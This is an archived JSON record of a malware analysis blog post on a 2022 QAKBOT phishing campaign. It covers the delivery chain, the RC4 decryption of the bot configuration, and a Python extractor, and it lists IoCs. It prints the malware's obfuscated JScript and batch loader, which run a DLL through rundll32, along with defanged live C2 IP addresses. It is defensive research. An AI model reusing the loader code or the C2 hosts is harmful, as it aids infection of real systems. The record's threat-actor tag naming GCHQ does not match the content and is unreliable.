{
    "id": "c0ec7677-597f-44b9-94d0-ec082aff80e2",
    "created_at": "2023-01-12T15:10:53.29082Z",
    "updated_at": "2025-03-27T02:08:33.287465Z",
    "deleted_at": null,
    "sha1_hash": "868564aa9ddec09a184790bcf253c97dcdc8ae2f",
    "title": "2022-10-13 - QAKBOT BB Configuration and C2 IPs List",
    "authors": "",
    "file_creation_date": "2022-11-28T18:53:30Z",
    "file_modification_date": "2022-11-28T18:53:30Z",
    "file_size": 1241897,
    "plain_text": "# QAKBOT BB Configuration and C2 IPs List\n\n**syrion.me/malware/qakbot-bb-extractor/**\n\nOctober 13, 2022\n4 minute read\n\n\nOctober 13, 2022\n\n\nThis is my first malware blog post, hope it will be useful to someone, I’ll not go deeper in the\nmalware details because there are plenty of detailed reports related to QAKBOT.\nI’ll describe\nhow the malware changed its resource decryption mechanism and report some IoCs.\n\nOn September 30, 2022 a friend of mine received a phishing email pretending to be sent by\none of his customers, the email contained an URL, a password and a legit old message.\n\n_Figure 1 - Phishing Email_\nBy visiting the URL https://lynxus[.]com/usq/refeidpisnretse with a user agent related to\nWindows, a working zip named Card654141047.zip is provided, if the user agent is not “ok”\nthe server responses with a fake zip file that doesn’t work.\n\n\n-----\n\n_Figure 2 - Malcious URL message containing the zip password_\nUsing the provided password “U492”, it is possible to extract an ISO file from the zip.\nThe\nISO file contains a LNK file and a hidden folder with the following files:\n\nexpeditionPresides.js\nredressingLamentations.cmd\nregressing.txt\nrougher.gif\ntiddler.dat\n\n_Figure 3 - Lnk File and hidden folder_\n\n_Figure 4 - Hidden folder content_\nThe LNK file is a link to expeditionPresides.js, it contains the following JScript:\n\n\n-----\n\n```\n// observablyCleaned\n\nvar undisruptedPuzzles = \"rund DllRegis\";\n\n// ShellExecute\n\nvar bridgeheadsLibels = new\nActiveXObject(\"shell.application\").shellexecute(\"assaulting\\\\redressingLamentations.cm\n undisruptedPuzzles, \"\", \"open\", 0);\n\n```\nit runs redressingLamentations.cmd by proving two parameters “rund DllRegis”.\nFollowing the content of redressingLamentations.cmd.\n```\n@echo off\n\nset a=ll\n\nset e=32\n\n:: tankageLicentiously\n\n%1%a%%e% assaulting\\tiddler.dat,%2terServer\n\nexit\n\n\n```\nIt uses rundll32 in order to execute the DllRegisterServer export function from tiddler.dat,\nfollowing some details of the DLL.\n\n_Figure 5 - tiddler.dat details_\n\n\n-----\n\n**Tiddler.dat is the first stage DLL used to extract the unpacked version of the malware, by**\nsetting a breakpoint on NtAllocateVirtualMemory it’s easy to find the unpacked version, I’ll\nnot describe how to get it.\n\nAfter unpacking the DLL, we can analyse it, the details are in the image below.\n\n_Figure 6 - Unpacked DLL details_\nAfter some analysis we can confirm that the malware is QAKBOT, the malware seems to be\nsimilar to the one reported by several blog post, anyway the BOT Configuration and the C2\n**IPs list are encrypted in a different way, so I’ll only describe how to decrypt it instead of write**\nsomething already reported in a very clear way by several blog posts:\n\n[Elastic](https://www.elastic.co/security-labs/qbot-malware-analysis)\n[Hornetsecurity](https://www.hornetsecurity.com/en/threat-research/qakbot-reducing-its-on-disk-artifacts/?_adin=02021864894)\n\n[You can find all the decrypted strings and the scripts in my GitHub.](https://github.com/Syrion89/Qakbot-2022.09.30)\n\nThe file has two resources, one containing the encrypted Configuration and one containing\nthe encrypted C2 IPs list.\n\n\n-----\n\n_Figure 7 - Resouce 3C91E639 containing the C2 list_\n\n_Figure 8 - Resource 89210AF9 containing the bot configuration_\nThe resources are encrypted in the same way, so let’s use the configuration resource as\nexample.\n\nTwo “steps” of RC4 encryption are used, let’ see it on [CyberChef in order to be clearer.](https://gchq.github.io/CyberChef/)\n\n\n-----\n\nAs shown in the image below, in the first step, the SHA1 Hash is calculated on the string,\n“Muhcu#YgcdXubYBu2@2ub4fbUhuiNhyVtcd”, the SHA1 Hash result is “CA 6A E9 55 26\n**F0 BC EB 6B A5 39 0E B6 14 81 9A 9B 4A F9 4E”, this will be the RC4 key (the string used**\nis different in each qakbot sample, for example in another sample I analyzed it was\n“bUdiuy81gYguty@4frdRdpfko(eKmudeuMncueaN”, you have to figure out which string it\nuses).\n\n_Figure 9 - SHA1 Hash of the string \"Muhcu#YgcdXubYBu2@2ub4fbUhuiNhyVtcd\"_\nUsing the data we obtain from SHA1 as key, we can use the RC4 algorithm to decrypt the\ndata. The output from the first RC4 decryption will contains the following data:\n\nFrom bytes 0 to 20: SHA1 Hash of New Key + Encrypted Configuration\nFrom bytes 20 to 40: New Key\nFrom bytes 40 to end: Encrypted Configuration\n\n\n-----\n\n_Figure 10 - Resource RC4 Decryption Step 1_\nIn the image below we can see that the SHA1 Hash of New Key + Encrypted\n**Configuration matches the first 20 bytes we got from the decrypted data.**\n\n_Figure 11 - SHA1(Encrypted Configuration)_\nIn the second step, the RC4 algorithm is used with the New Key to decrypt the Encrypted\n**Configuration. The following images shows the result of the second step decryption.**\n\n\n-----\n\n_Figure 12 - Resource RC4 Decryption Step 2_\nThe QAKBOT campaign ID is “BB” the timestamp 1664535088 corresponds to Fri Sep 30\n**2022 10:51:28 GMT+0000.**\n\n[While writing this, a blog post by Trendmicro was published talking about this specific](https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html)\nQAKBOT campaign.\n\nTo automatically extract the configuration and the C2 IPs, I wrote the following python script.\n\n\n-----\n\n```\nimport hashlib\n\nfrom arc4 import ARC4 \n\nfile = open(\"89210AF9.bin\",\"rb\") #Resource with Qakbot configuration\n\nresource = file.read()\n\nkey = hashlib.sha1(b\"Muhcu#YgcdXubYBu2@2ub4fbUhuiNhyVtcd\").digest() #change with your\npassword\n\nrc4 = ARC4(key)\n\ndata = rc4.decrypt(resource)\n\nkey = data[20:40]\n\nrc4 = ARC4(key)\n\ndecrypted_data = rc4.decrypt(data[40:])\n\nprint(\"Qakbot Configuration:\")\n\nprint((decrypted_data[20:]).decode(\"utf-8\"))\n\nfile = open(\"3C91E639.bin\",\"rb\") #Resource with Qakbot C2\n\nresource = file.read()\n\nkey = hashlib.sha1(b\"Muhcu#YgcdXubYBu2@2ub4fbUhuiNhyVtcd\").digest() #change with your\npassword\n\nrc4 = ARC4(key)\n\ndata = rc4.decrypt(resource)\n\n\nkey = data[20:40]\n\nrc4 = ARC4(key)\n\n#print(key)\n\ndecrypted_data = rc4.decrypt(data[40:])\n\n\nprint(\"Qakbot C2:\")\n\nfor i in range(21,len(decrypted_data),7):\n\n  c2 = bytearray(decrypted_data[i:i+7])\n\n  print(\"%d.%d.%d.%d:%d\" % (c2[0],c2[1],c2[2],c2[3],(c2[4]<<8)+c2[5]))\n\n```\nHope this first malware blog post can help someone during his analysis of QAKBOT, you can\nfind the samples at the following urls:\n\n**Configuration:**\n\n10=BB\n3=1664535088\n\n**File Hashes:**\n\n5B54F57DBAA74FA589AFB2D26D6C6B39E0C2930BD88FEA3172556CE96B3EB959\n796FF26DB045085EC8162D414CC2DEAFB2836D3F0BFFD8C58AF4595EBB4261E9\n\n\n-----\n\nD5F09EBC9B1F3FB9781ACA09E3B9FA63F90B909CC7418FF7D2AFA462F400DCE3\n8B08C031D365A0B4D032C6E51BF773655E15795FE3EABCD3FA6487FFE9F3D6B3\n93104C4834A27E39C13AC9D4663C6FA622AE6ECC5491A67DDF9125E6633CF07B\n55AD915DCD65192548046ECBECDA5AD8AD6A92A11F07EC9A92744FCAC1599501\n757D3C81555FBF635B2B9FD1D5222E6FE046710753395545A29E3E1F0A78FBF1\nBD3A47E0E27523044FEB2C30879EB684CFD174EC329350BAF5E0824FFFF1A22F\n\n**C2 IPs:**\n\n41.107.71[.]201:443\n105.101.230[.]16:443\n105.108.239[.]60:443\n196.64.227[.]5:8443\n41.249.158[.]221:995\n134.35.14[.]5:443\n113.170.117[.]251:443\n187.193.219[.]248:443\n122.166.244[.]116:443\n154.237.129[.]123:995\n41.98.229[.]81:443\n186.48.199[.]243:995\n102.156.3[.]13:443\n41.97.190[.]189:443\n197.207.191[.]164:443\n105.184.14[.]132:995\n196.207.146[.]151:443\n105.158.113[.]15:443\n196.89.42[.]89:995\n86.98.156[.]229:993\n177.174.119[.]195:32101\n81.156.194[.]147:2078\n80.253.189[.]55:443\n197.49.175[.]67:995\n177.45.78[.]52:993\n89.187.169[.]77:443\n196.92.59[.]242:995\n41.13.200[.]19:443\n41.97.195[.]237:443\n92.191.56[.]11:2222\n154.70.53[.]202:443\n210.186.37[.]98:50002\n\n\n-----\n\n## You may also enjoy\n\n Emotet Malicious Excel Analysis\n\nAugust 26, 2022\n1 minute read\n\nSometime ago a friend of mine sent me a suspicious email containg a zip file with an xls, at\nthe time I didn’t focus too much on what the file does and simpl...\n\n## DVIA v2 iOS URL Runtime Manipulation with Frida\n\nOctober 31, 2020\n2 minute read\n\nAfter my previous blog posts about DVIA v2 Anti-Debug and Frida with Swift some guys\nasked me about the URL Runtime Manipulation challenge in DVIA v2. I wil...\n\n## iOS Strings Obfuscation in Swift\n\nOctober 13, 2020\n4 minute read\n\nUsually when reversing an iOS Application, it’s common to see methods and strings that can\nhelp an attacker to figure out how the application works. When I’...\n\n## ELF x64 Bypass NX with mprotect()\n\nAugust 25, 2020\n4 minute read\n\nIn this blogpost, I’ll explain how to bypass NX using mprotect() in order to make the stack\nexecutable.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-10-13 - QAKBOT BB Configuration and C2 IPs List.pdf"
    ],
    "report_names": [
        "2022-10-13 - QAKBOT BB Configuration and C2 IPs List.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536253,
    "ts_updated_at": 1743041313,
    "ts_creation_date": 1669661610,
    "ts_modification_date": 1669661610,
    "files": {
        "pdf": "https://archive.orkl.eu/868564aa9ddec09a184790bcf253c97dcdc8ae2f.pdf",
        "text": "https://archive.orkl.eu/868564aa9ddec09a184790bcf253c97dcdc8ae2f.txt",
        "img": "https://archive.orkl.eu/868564aa9ddec09a184790bcf253c97dcdc8ae2f.jpg"
    }
}